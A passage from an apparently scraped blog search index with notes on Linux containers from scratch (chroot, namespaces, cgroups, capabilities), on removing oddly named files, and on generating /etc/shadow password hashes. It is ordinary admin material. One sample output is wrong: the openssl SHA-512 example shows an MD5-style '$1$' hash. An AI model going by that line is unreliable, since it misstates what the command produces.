process\u0026rsquo; view of the file system. In this case, we\u0026rsquo;ll restrict our process to the \u0026ldquo;rootfs\u0026rdquo; directory then exec a shell.\n$ sudo chroot rootfs /bin/bash root@localhost:/# ls / bin dev home lib64 mnt proc run srv tmp var boot etc lib media opt root sbin sys usr root@localhost:/# which python /usr/bin/python root@localhost:/# /usr/bin/python -c \u0026#39;print \u0026#34;Hello, container world!\u0026#34;\u0026#39; Hello, container world! root@localhost:/# When we execute the Python interpreter, we\u0026rsquo;re executing rootfs/usr/bin/python, not the host\u0026rsquo;s Python.\nCreating namespaces with unshare $ sudo unshare -p -f --mount-proc=$PWD/rootfs/proc \\ chroot rootfs /bin/bash root@localhost:/# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 20268 3240 ? S 22:34 0:00 /bin/bash root 2 0.0 0.0 17504 2096 ? R+ 22:34 0:00 ps aux root@localhost:/# In this case, we\u0026rsquo;ll create a PID namespace for the shell, then execute the chroot like the last example.\nEntering namespaces with nsenter Let\u0026rsquo;s find the shell running in a chroot from our last example. $ # From the host, not the chroot. $ ps aux | grep /bin/bash | grep root ... root 29840 0.0 0.0 20272 3064 pts/5 S+ 17:25 0:00 /bin/bash The kernel exposes namespaces under /proc/(PID)/ns as files. In this case, /proc/29840/ns/pid is the process namespace we\u0026rsquo;re hoping to join.\nThe nsenter command provides a wrapper around setns to enter a namespace. We\u0026rsquo;ll provide the namespace file, then run the unshare to remount /proc and chroot to setup a chroot. This time, instead of creating a new namespace, our shell will join the existing one. $ sudo nsenter --pid=/proc/29840/ns/pid \\ unshare -f --mount-proc=$PWD/rootfs/proc \\ chroot rootfs /bin/bash root@localhost:/# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 20272 3064 ? S+ 00:25 0:00 /bin/bash root 5 0.0 0.0 20276 3248 ? S 00:29 0:00 /bin/bash root 6 0.0 0.0 17504 1984 ? R+ 00:30 0:00 ps aux Getting around chroot with mounts First, let\u0026rsquo;s make a new directory to mount into the chroot and create a file there. $ sudo mkdir readonlyfiles $ echo \u0026#34;hello\u0026#34; \u0026gt; readonlyfiles/hi.txt Next, we\u0026rsquo;ll create a target directory in our container and bind mount the directory providing the -o ro argument to make it read-only. $ sudo mkdir -p rootfs/var/readonlyfiles $ sudo mount --bind -o ro $PWD/readonlyfiles $PWD/rootfs/var/readonlyfiles cgroups The kernel exposes cgroups through the /sys/fs/cgroup directory. If your machine doesn\u0026rsquo;t have one you may have to mount the memory cgroup to follow along.\n$ ls /sys/fs/cgroup/ blkio cpuacct cpuset freezer memory net_cls,net_prio perf_event systemd cpu cpu,cpuacct devices hugetlb net_cls net_prio pids Creating a cgroup is easy, just create a directory. In this case we\u0026rsquo;ll create a memory group called \u0026ldquo;demo\u0026rdquo;. Once created, the kernel fills the directory with files that can be used to configure the cgroup.\n$ sudo su # mkdir /sys/fs/cgroup/memory/demo # ls /sys/fs/cgroup/memory/demo/ cgroup.clone_children memory.memsw.failcnt cgroup.event_control memory.memsw.limit_in_bytes cgroup.procs memory.memsw.max_usage_in_bytes memory.failcnt memory.memsw.usage_in_bytes memory.force_empty memory.move_charge_at_immigrate memory.kmem.failcnt memory.numa_stat memory.kmem.limit_in_bytes memory.oom_control memory.kmem.max_usage_in_bytes memory.pressure_level memory.kmem.slabinfo memory.soft_limit_in_bytes memory.kmem.tcp.failcnt memory.stat memory.kmem.tcp.limit_in_bytes memory.swappiness memory.kmem.tcp.max_usage_in_bytes memory.usage_in_bytes memory.kmem.tcp.usage_in_bytes memory.use_hierarchy memory.kmem.usage_in_bytes notify_on_release memory.limit_in_bytes tasks memory.max_usage_in_bytes To adjust a value we just have to write to the corresponding file. Let\u0026rsquo;s limit the cgroup to 100MB of memory and turn off swap.\n# echo \u0026#34;100000000\u0026#34; \u0026gt; /sys/fs/cgroup/memory/demo/memory.limit_in_bytes # echo \u0026#34;0\u0026#34; \u0026gt; /sys/fs/cgroup/memory/demo/memory.swappiness The tasks file is special, it contains the list of processes which are assigned to the cgroup. To join the cgroup we can write our own PID.\n# echo $$ \u0026gt; /sys/fs/cgroup/memory/demo/tasks Finally we need a memory hungry application.\n# hungry.py f = open(\u0026#34;/dev/urandom\u0026#34;, \u0026#34;r\u0026#34;) data = \u0026#34;\u0026#34; i=0 while True: data += f.read(10000000) # 10mb i += 1 print \u0026#34;%dmb\u0026#34; % (i*10,) # python hungry.py 10mb 20mb 30mb 40mb 50mb 60mb 70mb 80mb Killed cgroups can\u0026rsquo;t be removed until every processes in the tasks file has exited or been reassigned to another group. Exit the shell and remove the directory with rmdir (don\u0026rsquo;t use rm -r).\n# exit exit $ sudo rmdir /sys/fs/cgroup/memory/demo Container security and capabilities package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) func main() { if _, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:80\u0026#34;); err != nil { fmt.Fprintln(os.Stdout, err) os.Exit(2) } fmt.Println(\u0026#34;success\u0026#34;) } $ go build -o listen listen.go $ ./listen listen tcp :80: bind: permission denied # In this case, CAP_NET_BIND_SERVICE allows executables to listen on lower ports. $ sudo setcap cap_net_bind_service=+ep listen $ getcap listen listen = cap_net_bind_service+ep $ ./listen success For things already running as root, like most containerized apps, we\u0026rsquo;re more interested in taking capabilities away than granting them.\n$ sudo su # capsh --print Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37 Securebits: 00/0x0/1\u0026#39;b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked) uid=0(root) gid=0(root) groups=0(root) As an example, we\u0026rsquo;ll use capsh to drop a few capabilities including CAP_CHOWN. If things work as expected, our shell shouldn\u0026rsquo;t be able to modify file ownership despite being root.\n$ sudo capsh --drop=cap_chown,cap_setpcap,cap_setfcap,cap_sys_admin --chroot=$PWD/rootfs -- root@localhost:/# whoami root root@localhost:/# chown nobody /bin/ls chown: changing ownership of \u0026#39;/bin/ls\u0026#39;: Operation not permitted ","date":"November 24, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221124-containers-from-scratch/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ericchiang.github.io/post/containers-from-scratch/\" target=\"_blank\" rel=\"noopener\"\u003eContainers from scratch\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"container-file-systems\"\u003eContainer file systems\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ wget https://github.com/ericchiang/containers-from-scratch/releases/download/v0.1.0/rootfs.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sha256sum rootfs.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ec79bfb46b9cf842055761a49161831aee8f4e667ad9e84ab57ab324a49bc828c  rootfs.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ \u003cspan style=\"color:#75715e\"\u003e# tar needs sudo to create /dev files and setup file ownership\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo tar -zxf rootfs.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ls rootfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebin   dev  home  lib64  mnt  proc  run   srv  tmp  var\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eboot  etc  lib   media  opt  root  sbin  sys  usr\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ls -al rootfs/bin/ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rwxr-xr-x. \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e root root \u003cspan style=\"color:#ae81ff\"\u003e118280\u003c/span\u003e Mar \u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e2015\u003c/span\u003e rootfs/bin/ls\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"chroot\"\u003echroot\u003c/h3\u003e\n\u003cp\u003eit allows us to restrict a process\u0026rsquo; view of the file system. In this case, we\u0026rsquo;ll restrict our process to the \u0026ldquo;rootfs\u0026rdquo; directory then exec a shell.\u003c/p\u003e","tags":["URL","Linux","container"],"title":"Containers from scratch"},{"categories":["URL","Linux","SHELL","command line"],"contents":" How to Delete Files With Names That Contain Non-printable Characters ls -l total 13 -rw-r--r-- 1 ZZ 197121 4 Nov 6 07:08 \u0026#39; \u0026#39; -rw-r--r-- 1 ZZ 197121 162 Apr 16 2022 \u0026#39;~$iscord.docx\u0026#39; -rw-r--r-- 1 ZZ 197121 6 Nov 6 06:03 \u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:01 \u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39;\u0026#39;Λ---ω\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:13 \u0026#39;␴?␴??␴??::␴?␴\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:12 ␴__␴ -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:14 ␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴ -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:18 \u0026#39;␴ω␴␴␣␦\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:16 ␣␣␣␣␣␣␣␣ -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:26 ␣ μ μ Ω Ω -rw-r--r-- 1 ZZ 197121 14 Nov 6 06:23 \u0026#39;␣ μ ␴\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39;\u0026#39;Ξ\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:27 -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:27 Using ANSI-C Quoting # Using ANSI-C Quoting rm \u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39; # We can also use the $ special character before enclosing the filename in single quotes rm $\u0026#39;\\356\\200\\215\u0026#39; # pass an item\u0026#39;s name to rm without using the ANSI-C quoting rm \u0026#39;\\026\\033\u0026#39; rm: cannot remove \u0026#39;\\026\\033\u0026#39;: No such file or directory Using Inode Numbers ls -li total 11 ... 6517085 -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:18 \u0026#39;␴ω␴␴␣␦\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39; 7826050 -rw-r--r-- 1 ZZ 197121 3 Nov 9 04:23 \u0026#39;\u0026#39;$\u0026#39;\\356\\200\\215\\356\\200\\215\\356\\200\\215\u0026#39; 4685554 -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:27 we can delete the desired file by passing its inode number to the -inum switch of the find command\nfind . -inum 4685554 -exec rm -i {} \\; rm: remove regular file \u0026#39;./ \u0026#39;? y Using rm Interactive Option With Bash Globbing rm -i * rm: remove regular file \u0026#39; \u0026#39;?y rm: remove regular file \u0026#39; \u0026#39;?y ... Using the Vim Text Editor vim . After choosing the target file, we simply use Shift+D, type y or yes, and hit the Return key to delete it.\n","date":"November 14, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221114-delete-files-non-printable-characters/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/delete-files-non-printable-characters\" target=\"_blank\" rel=\"noopener\"\u003eHow to Delete Files With Names That Contain Non-printable Characters\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003els -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etotal \u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 07:08 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;      \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e162\u003c/span\u003e Apr \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;~$iscord.docx\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:03 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:01 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39;\u0026#39;Λ---ω\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:13 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;␴?␴??␴??::␴?␴\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:12  ␴__␴\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:14  ␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:18 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;␴ω␴␴␣␦\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:16  ␣␣␣␣␣␣␣␣\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:26  ␣   μ   μ   Ω  Ω\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:23 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;␣   μ  ␴\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39;\u0026#39;Ξ\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:27\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:27\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"using-ansi-c-quoting\"\u003eUsing ANSI-C Quoting\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Using ANSI-C Quoting\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# We can also use the $ special character before enclosing the filename in single quotes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm \u003cspan style=\"color:#e6db74\"\u003e$\u0026#39;\\356\\200\\215\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# pass an item\u0026#39;s name to rm without using the ANSI-C quoting\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\026\\033\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm: cannot remove \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\026\\033\u0026#39;\u003c/span\u003e: No such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"using-inode-numbers\"\u003eUsing Inode Numbers\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003els -li\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etotal \u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e6517085\u003c/span\u003e -rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:18 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;␴ω␴␴␣␦\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e7826050\u003c/span\u003e -rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e 04:23 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;$\u0026#39;\\356\\200\\215\\356\\200\\215\\356\\200\\215\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e4685554\u003c/span\u003e -rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:27\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ewe can delete the desired file by passing its inode number to the -inum switch of the find command\u003c/p\u003e","tags":["URL","Linux","SHELL","command line"],"title":"How to Delete Files With Names That Contain Non-printable Characters"},{"categories":["URL","Linux","SHELL","command line"],"contents":" /etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes chage and Password Aging chage --list root Last password change : Oct 01, 2022 Password expires : never Password inactive : never Account expires : never Minimum number of days between password change : 0 Maximum number of days between password change : 99999 Number of days of warning before password expires : 7 Consequently, we can change any field via its associated flag:\n-d or --lastday for the last change date -m or --mindays for the days between password changes -M or --maxdays for the maximum password validity -W or --warndays for the warning period -I or --inactive for the inactivity period -E or --expiredate for the expiration period chpasswd and Passwords echo 'user1:PASSWORD' | chpasswd --crypt-method SHA512\ncrypt() and Encryption Algorithms Essentially, the initial characters of the password field value in /etc/shadow identify the encryption algorithm:\n$1$ is Message Digest 5 (MD5) $2a$ is blowfish $5$ is 256-bit Secure Hash Algorithm (SHA-256) $6$ is 512-bit Secure Hash Algorithm (SHA-512) $y$ (or $7$) is yescrypt noneof the above means DES Generate /etc/shadow Passwords OpenSSL support several types of hashing:\n-crypt for the standard UNIX crypt, i.e., DES (default) -apr1 for the Apache-specific MD5 variant -1 for MD5 -5 for SHA-256 -6 for SHA-512 # OpenSSL openssl passwd -6 PASSWORD $1$SALT$YQNBYRN9kIvLkQIp4SpsO0 # Perl perl -e \u0026#39;print crypt \u0026#34;PASSWORD\u0026#34;, \u0026#34;\\$6\\$SALT\\$\u0026#34;\u0026#39; $6$SALT$io0TPmhM8ythCm7Idt0AfYvTuFCLyA1CMVmeT3EUqarf2NQcTuLKEgP9.4Q8fgClzP7OCnyOY1wo1xDw0jtyH1 # Python python3 -c \u0026#39;import crypt; print(crypt.crypt(\u0026#34;PASSWORD\u0026#34;, \u0026#34;$6$SALT\u0026#34;))\u0026#39; $6$SALT$io0TPmhM8ythCm7Idt0AfYvTuFCLyA1CMVmeT3EUqarf2NQcTuLKEgP9.4Q8fgClzP7OCnyOY1wo1xDw0jtyH1 python3 -c \u0026#39;import crypt,getpass; print(crypt.crypt(\u0026#34;PASSWORD\u0026#34;,crypt.mksalt(crypt.METHOD_SHA512)))\u0026#39; python3 -c \u0026#39;import crypt,getpass; print(crypt.crypt(getpass.getpass(),crypt.mksalt(crypt.METHOD_SHA512)))\u0026#39; # Ruby ruby -e \u0026#39;puts \u0026#34;PASSWORD\u0026#34;.crypt(\u0026#34;$6$SALT\u0026#34;)\u0026#39; $6$SALT$io0TPmhM8ythCm7Idt0AfYvTuFCLyA1CMVmeT3EUqarf2NQcTuLKEgP9.4Q8fgClzP7OCnyOY1wo1xDw0jtyH1 # we can also use a random salt and stdin for the password entry ruby -e \u0026#39;require \u0026#34;io/console\u0026#34;; puts IO::console.getpass.crypt(\u0026#34;$6$\u0026#34; + rand(36 ** 8).to_s(36))\u0026#39; ","date":"November 14, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221114-shadow-passwords/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/shadow-passwords\" target=\"_blank\" rel=\"noopener\"\u003e/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"chage-and-password-aging\"\u003echage and Password Aging\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echage --list root\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLast password change                                    : Oct 01, \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 